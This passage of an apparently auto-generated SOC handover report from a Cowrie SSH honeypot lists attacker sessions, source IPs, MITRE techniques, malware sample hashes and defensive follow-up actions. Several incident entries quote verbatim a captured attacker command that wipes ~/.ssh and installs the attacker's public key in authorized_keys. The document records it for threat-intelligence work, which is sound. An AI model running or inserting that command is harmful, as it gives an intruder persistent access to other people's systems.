| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 05:02:53` | `cowrie.session.connect` |
| `2026-04-19 05:02:53` | `cowrie.client.version` |
| `2026-04-19 05:02:53` | `cowrie.client.kex` |
| `2026-04-19 05:02:54` | `cowrie.login.success` |
| `2026-04-19 05:02:54` | `cowrie.session.params` |
| `2026-04-19 05:02:54` | `cowrie.command.input` |
| `2026-04-19 05:02:54` | `cowrie.command.failed` |
| `2026-04-19 05:02:54` | `cowrie.log.closed` |
| `2026-04-19 05:02:54` | `cowrie.session.params` |
| `2026-04-19 05:02:54` | `cowrie.command.input` |
| `2026-04-19 05:02:54` | `cowrie.session.file_download` |
| `2026-04-19 05:02:54` | `cowrie.log.closed` |
| `2026-04-19 05:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df51edf28593

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 05:02 |
| **Last Seen** | 2026-04-19 05:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 05:02:56` | `cowrie.session.connect` |
| `2026-04-19 05:02:56` | `cowrie.client.version` |
| `2026-04-19 05:02:56` | `cowrie.client.kex` |
| `2026-04-19 05:02:57` | `cowrie.login.success` |
| `2026-04-19 05:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e3b4ab80db3

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 05:04 |
| **Last Seen** | 2026-04-19 05:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 05:04:39` | `cowrie.session.connect` |
| `2026-04-19 05:04:39` | `cowrie.client.version` |
| `2026-04-19 05:04:40` | `cowrie.client.kex` |
| `2026-04-19 05:04:40` | `cowrie.login.success` |
| `2026-04-19 05:04:40` | `cowrie.session.params` |
| `2026-04-19 05:04:40` | `cowrie.command.input` |
| `2026-04-19 05:04:40` | `cowrie.command.failed` |
| `2026-04-19 05:04:40` | `cowrie.log.closed` |
| `2026-04-19 05:04:41` | `cowrie.session.params` |
| `2026-04-19 05:04:41` | `cowrie.command.input` |
| `2026-04-19 05:04:41` | `cowrie.session.file_download` |
| `2026-04-19 05:04:41` | `cowrie.log.closed` |
| `2026-04-19 05:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5091cdb54239

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 05:04 |
| **Last Seen** | 2026-04-19 05:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 05:04:43` | `cowrie.session.connect` |
| `2026-04-19 05:04:43` | `cowrie.client.version` |
| `2026-04-19 05:04:43` | `cowrie.client.kex` |
| `2026-04-19 05:04:43` | `cowrie.login.success` |
| `2026-04-19 05:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e7f733d827c

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 05:06 |
| **Last Seen** | 2026-04-19 05:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 05:06:29` | `cowrie.session.connect` |
| `2026-04-19 05:06:29` | `cowrie.client.version` |
| `2026-04-19 05:06:29` | `cowrie.client.kex` |
| `2026-04-19 05:06:30` | `cowrie.login.success` |
| `2026-04-19 05:06:30` | `cowrie.session.params` |
| `2026-04-19 05:06:30` | `cowrie.command.input` |
| `2026-04-19 05:06:30` | `cowrie.command.failed` |
| `2026-04-19 05:06:30` | `cowrie.log.closed` |
| `2026-04-19 05:06:30` | `cowrie.session.params` |
| `2026-04-19 05:06:30` | `cowrie.command.input` |
| `2026-04-19 05:06:30` | `cowrie.session.file_download` |
| `2026-04-19 05:06:30` | `cowrie.log.closed` |
| `2026-04-19 05:06:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-544272d2892c

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 05:06 |
| **Last Seen** | 2026-04-19 05:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 05:06:32` | `cowrie.session.connect` |
| `2026-04-19 05:06:32` | `cowrie.client.version` |
| `2026-04-19 05:06:32` | `cowrie.client.kex` |
| `2026-04-19 05:06:33` | `cowrie.login.success` |
| `2026-04-19 05:06:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9adff911d55f

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 05:08 |
| **Last Seen** | 2026-04-19 05:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 05:08:21` | `cowrie.session.connect` |
| `2026-04-19 05:08:21` | `cowrie.client.version` |
| `2026-04-19 05:08:21` | `cowrie.client.kex` |
| `2026-04-19 05:08:21` | `cowrie.login.success` |
| `2026-04-19 05:08:22` | `cowrie.session.params` |
| `2026-04-19 05:08:22` | `cowrie.command.input` |
| `2026-04-19 05:08:22` | `cowrie.command.failed` |
| `2026-04-19 05:08:22` | `cowrie.log.closed` |
| `2026-04-19 05:08:22` | `cowrie.session.params` |
| `2026-04-19 05:08:22` | `cowrie.command.input` |
| `2026-04-19 05:08:22` | `cowrie.session.file_download` |
| `2026-04-19 05:08:22` | `cowrie.log.closed` |
| `2026-04-19 05:08:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e87e1ff4fb66

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 05:08 |
| **Last Seen** | 2026-04-19 05:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 05:08:24` | `cowrie.session.connect` |
| `2026-04-19 05:08:24` | `cowrie.client.version` |
| `2026-04-19 05:08:24` | `cowrie.client.kex` |
| `2026-04-19 05:08:24` | `cowrie.login.success` |
| `2026-04-19 05:08:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.179.27[.]94` | **25** | 2026-04-19 04:22 | 2026-04-19 05:08 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `114.130.85[.]36` | **10** | 2026-04-19 03:18 | 2026-04-19 03:36 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `18.116.101[.]220` | **6** | 2026-04-19 04:40 | 2026-04-19 04:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `14.103.149[.]158` | **3** | 2026-04-19 03:18 | 2026-04-19 03:18 | 6m | 0 | `T1592` | 🟢 LOW |
| `115.190.28[.]157` | **2** | 2026-04-19 04:16 | 2026-04-19 04:24 | 2m | 0 | `T1592` | 🟢 LOW |
| `185.93.89[.]191` | **2** | 2026-04-19 05:40 | 2026-04-19 05:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.14.73[.]1` | **2** | 2026-04-19 05:21 | 2026-04-19 05:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.113.104[.]43` | 1 | 2026-04-19 04:22 | 2026-04-19 04:22 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.82[.]124` | 1 | 2026-04-19 04:22 | 2026-04-19 04:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `138.68.249[.]116` | 1 | 2026-04-19 04:23 | 2026-04-19 04:23 | 8s | 0 | `T1592` | 🟢 LOW |
| `185.93.89[.]190` | 1 | 2026-04-19 05:40 | 2026-04-19 05:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.93.89[.]193` | 1 | 2026-04-19 05:40 | 2026-04-19 05:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.27.63[.]238` | 1 | 2026-04-19 03:18 | 2026-04-19 03:19 | 77s | 1 | `T1110.001` | 🟢 LOW |
| `20.55.87[.]146` | 1 | 2026-04-19 06:00 | 2026-04-19 06:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.134.251[.]17` | 1 | 2026-04-19 04:19 | 2026-04-19 04:20 | 31s | 0 | `T1592` | 🟢 LOW |
| `27.137.233[.]190` | 1 | 2026-04-19 05:42 | 2026-04-19 05:42 | 12s | 0 | `T1592` | 🟢 LOW |
| `35.225.56[.]202` | 1 | 2026-04-19 04:22 | 2026-04-19 04:23 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.165.176[.]201` | 1 | 2026-04-19 04:25 | 2026-04-19 04:25 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `82.152.132[.]24` | 1 | 2026-04-19 04:21 | 2026-04-19 04:21 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.156.14[.]80` | 1 | 2026-04-19 04:38 | 2026-04-19 04:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `43.165.176[.]201` | JP | ACEVILLE PTE.LTD. | **100** ⚠️ | 2 |
| `185.93.89[.]191` | NL | Limited Network LTD | **100** ⚠️ | 50 |
| `185.93.89[.]190` | NL | Limited Network LTD | **100** ⚠️ | 50 |
| `27.137.233[.]190` | JP | JCOM Co., Ltd. | **100** ⚠️ | 20 |
| `2.27.63[.]238` | DE | Kyonix Hosting - kyonix.com | **100** ⚠️ | 3 |
| `120.48.82[.]124` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 18 |
| `220.134.251[.]17` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 21 |
| `138.68.249[.]116` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `103.179.27[.]94` | ID | PT Primadona Media Digitalindo | **100** ⚠️ | 41 |
| `185.93.89[.]193` | NL | Limited Network LTD | **100** ⚠️ | 46 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 89 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 41 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 37 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 19 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 18 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 102 cases |
| Tool 34  | Credential Extractor        | ✅ 78 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (2.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 37 priority case(s) shown individually · 20 recon entry/entries in table (7 group(s) consolidating 50 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-19T06:01:09Z_
